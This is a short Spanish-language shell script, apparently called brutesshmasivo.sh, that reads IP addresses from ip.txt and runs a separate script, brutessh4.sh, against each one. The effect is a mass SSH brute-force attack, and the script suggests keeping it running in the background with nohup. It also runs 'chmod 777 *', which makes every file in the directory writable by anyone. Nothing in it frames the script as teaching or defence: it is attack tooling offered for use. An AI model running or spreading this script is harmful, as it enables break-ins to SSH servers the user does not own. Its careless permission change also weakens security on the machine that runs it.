echo "ssh masivo a IPs en fichero ip.txt"
chmod 777 *
echo "Para mantener como proceso ejecutar: nohup ./brutesshmasivo.sh &"
echo "Uso.: ./brutesshmasivo.sh "
for n in `cat ip.txt`
do sh brutessh4.sh $n
done
